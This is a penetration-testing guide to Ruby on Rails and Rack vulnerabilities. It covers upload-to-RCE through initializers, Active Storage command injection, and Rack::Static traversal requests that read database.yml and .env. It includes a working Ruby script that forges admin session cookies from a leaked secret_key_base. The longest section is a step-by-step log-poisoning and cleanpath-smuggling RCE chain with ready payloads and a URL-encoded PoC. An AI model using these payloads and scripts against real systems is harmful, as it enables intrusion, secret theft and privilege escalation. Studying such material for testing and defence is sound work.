## File upload to RCE

As explained in [this article](https://www.offsec.com/blog/cve-2024-46986/), uploading a `.rb` file into sensitive directories such as `config/initializers/` can lead to remote code execution (RCE) in Ruby on Rails applications.

Tips:
- Other boot/eager-load locations that are executed on app start are also risky when writeable (e.g., `config/initializers/` is the classic one). If you find an arbitrary file upload that lands anywhere under `config/` and is later evaluated/required, you may obtain RCE at boot.
- Look for dev/staging builds that copy user-controlled files into the container image where Rails will load them on boot.

## Active Storage image transformation → command execution (CVE-2025-24293)

When an application uses Active Storage with `image_processing` + `mini_magick`, and passes untrusted parameters to image transformation methods, Rails versions prior to 7.1.5.2 / 7.2.2.2 / 8.0.2.1 could allow command injection because some transformation methods were mistakenly allowed by default.

- A vulnerable pattern looks like:
  ```erb
  <%= image_tag blob.variant(params[:t] => params[:v]) %>
  ```
  where `params[:t]` and/or `params[:v]` are attacker-controlled.

- What to try during testing
  - Identify any endpoints that accept variant/processing options, transformation names, or arbitrary ImageMagick arguments.
  - Fuzz `params[:t]` and `params[:v]` for suspicious errors or execution side-effects. If you can influence the method name or pass raw arguments that reach MiniMagick, you may get code exec on the image processor host.
  - If you only have read-access to generated variants, attempt blind exfiltration via crafted ImageMagick operations.

- Remediation/detections
  - If you see Rails < 7.1.5.2 / 7.2.2.2 / 8.0.2.1 with Active Storage + `image_processing` + `mini_magick` and user-controlled transformations, consider it exploitable. Recommend upgrading and enforcing strict allowlists for methods/params and a hardened ImageMagick policy.

## Rack::Static LFI / path traversal (CVE-2025-27610)

If the target stack uses Rack middleware directly or via frameworks, versions of `rack` prior to 2.2.13, 3.0.14, and 3.1.12 allow Local File Inclusion via `Rack::Static` when `:root` is unset/misconfigured. Encoded traversal in `PATH_INFO` can expose files under the process working directory or an unexpected root.

- Hunt for apps that mount `Rack::Static` in `config.ru` or middleware stacks. Try encoded traversals against static paths, for example:
  ```text
  GET /assets/%2e%2e/%2e%2e/config/database.yml
  GET /favicon.ico/..%2f..%2f.env
  ```
  Adjust the prefix to match configured `urls:`. If the app responds with file contents, you likely have LFI to anything under the resolved `:root`.

- Mitigation: upgrade Rack; ensure `:root` only points to a directory of public files and is explicitly set.

## Forging/decrypting Rails cookies when `secret_key_base` is leaked

Rails encrypts and signs cookies using keys derived from `secret_key_base`. If that value leaks (e.g., in a repo, logs, or misconfigured credentials), you can usually decrypt, modify, and re-encrypt cookies. This often leads to authz bypass if the app stores roles, user IDs, or feature flags in cookies.

Minimal Ruby to decrypt and re-encrypt modern cookies (AES-256-GCM, default in recent Rails):
```ruby
require 'cgi'
require 'json'
require 'active_support'
require 'active_support/message_encryptor'
require 'active_support/key_generator'

secret_key_base = ENV.fetch('SECRET_KEY_BASE_LEAKED')
raw_cookie = CGI.unescape(ARGV[0])

salt   = 'authenticated encrypted cookie'
cipher = 'aes-256-gcm'
key_len = ActiveSupport::MessageEncryptor.key_len(cipher)
secret  = ActiveSupport::KeyGenerator.new(secret_key_base, iterations: 1000).generate_key(salt, key_len)
enc     = ActiveSupport::MessageEncryptor.new(secret, cipher: cipher, serializer: JSON)

plain = enc.decrypt_and_verify(raw_cookie)
puts "Decrypted: #{plain.inspect}"

# Modify and re-encrypt (example: escalate role)
plain['role'] = 'admin' if plain.is_a?(Hash)
forged = enc.encrypt_and_sign(plain)
puts "Forged cookie: #{CGI.escape(forged)}"
```
Notes:
- Older apps may use AES-256-CBC and salts `encrypted cookie` / `signed encrypted cookie`, or JSON/Marshal serializers. Adjust salts, cipher, and serializer accordingly.
- On compromise/assessment, rotate `secret_key_base` to invalidate all existing cookies.

## Log Injection → RCE via Ruby `load` and `Pathname.cleanpath` smuggling

When an app (often a simple Rack/Sinatra/Rails endpoint) both:
- logs a user-controlled string verbatim, and
- later `load`s a file whose path is derived from that same string (after `Pathname#cleanpath`),

You can often achieve remote code execution by poisoning the log and then coercing the app to `load` the log file. Key primitives:

- Ruby `load` evaluates the target file content as Ruby regardless of file extension. Any readable text file whose contents parse as Ruby will be executed.
- `Pathname#cleanpath` collapses `.` and `..` segments without hitting the filesystem, enabling path smuggling: attacker-controlled junk can be prepended for logging while the cleaned path still resolves to the intended file to execute (e.g., `../logs/error.log`).

### Minimal vulnerable pattern

```ruby
require 'logger'
require 'pathname'

logger   = Logger.new('logs/error.log')
param    = CGI.unescape(params[:script])
path_obj = Pathname.new(param)

logger.info("Running backup script #{param}")            # Raw log of user input
load "scripts/#{path_obj.cleanpath}"                     # Executes file after cleanpath
```

### Why the log can contain valid Ruby
`Logger` writes prefix lines like:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script <USER_INPUT>
```
In Ruby, `#` starts a comment and `9/2/2025` is just arithmetic. To inject valid Ruby code you need to:
- Begin your payload on a new line so it is not commented out by the `#` in the INFO line; send a leading newline (`\n` or `%0A`).
- Close the dangling `[` introduced by the INFO line. A common trick is to start with `]` and optionally make the parser happy with `][0]=1`.
- Then place arbitrary Ruby (e.g., `system(...)`).

Example of what will end up in the log after one request with a crafted param:
```
I, [9/2/2025 #209384]  INFO -- : Running backup script
][0]=1;system("touch /tmp/pwned")#://../../../../logs/error.log
```

### Smuggling a single string that both logs code and resolves to the log path
We want one attacker-controlled string that:
- when logged raw, contains our Ruby payload, and
- when passed through `Pathname.new(<input>).cleanpath`, resolves to `../logs/error.log` so the subsequent `load` executes the just-poisoned log file.

`Pathname#cleanpath` ignores schemes and collapses traversal components, so the following works:
```ruby
require 'pathname'

p = Pathname.new("\n][0]=1;system(\"touch /tmp/pwned\")#://../../../../logs/error.log")
puts p.cleanpath   # => ../logs/error.log
```
- The `#` before `://` ensures Ruby ignores the tail when the log is executed, while `cleanpath` still reduces the suffix to `../logs/error.log`.
- The leading newline breaks out of the INFO line; `]` closes the dangling bracket; `][0]=1` satisfies the parser.

### End-to-end exploitation
1. Send the following as the backup script name (URL-encode the first newline as `%0A` if needed):
   ```
   \n][0]=1;system("id > /tmp/pwned")#://../../../../logs/error.log
   ```
2. The app logs your raw string into `logs/error.log`.
3. The app computes `cleanpath` which resolves to `../logs/error.log` and calls `load` on it.
4. Ruby executes the code you injected in the log.

To exfiltrate a file in a CTF-like environment:
```
\n][0]=1;f=Dir['/tmp/flag*.txt'][0];c=File.read(f);puts c#://../../../../logs/error.log
```
URL-encoded PoC (first char is a newline):
```
%0A%5D%5B0%5D%3D1%3Bf%3DDir%5B%27%2Ftmp%2Fflag%2A.txt%27%5D%5B0%5D%3Bc%3DFile.read(f)%3Bputs%20c%23%3A%2F%2F..%2F..%2F..%2F..%2Flogs%2Ferror.log
```
